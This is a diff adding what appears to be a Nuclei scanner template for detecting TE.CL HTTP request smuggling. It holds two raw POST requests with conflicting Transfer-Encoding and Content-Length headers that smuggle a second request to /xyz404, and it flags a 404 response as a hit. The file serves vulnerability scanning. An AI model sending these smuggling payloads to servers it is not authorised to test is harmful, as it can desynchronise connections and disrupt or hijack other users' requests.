@@ -1,0 +1,54 @@
+id: smuggling-te-cl-basic
+
+info:
+  name: HTTP Request Smuggling - TE.CL - Basic - No tricks
+  author: aravazhimdr
+  severity: info
+  tags: smuggling,te.cl
+
+requests:
+  - raw:
+    - |
+      POST / HTTP/1.1
+      Transfer-Encoding: chunked
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0
+      Connection: keep-alive
+      Cookie: AS=sa
+      Content-Length: 4
+      
+      bc
+      POST /xyz404 HTTP/1.1
+      Host: localhost
+      Cookie: asa=asd
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0
+      Content-Length: 23
+      
+      X=1
+      0\r\n
+    - |
+      POST / HTTP/1.1
+      Transfer-Encoding: chunked
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0
+      Connection: keep-alive
+      Cookie: AS=sa
+      Content-Length: 4
+      
+      bc
+      POST /xyz404 HTTP/1.1
+      Host: localhost
+      Cookie: asa=asd
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0
+      Content-Length: 23
+      
+      X=1
+      0\r\n
+      
+    unsafe: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==404'
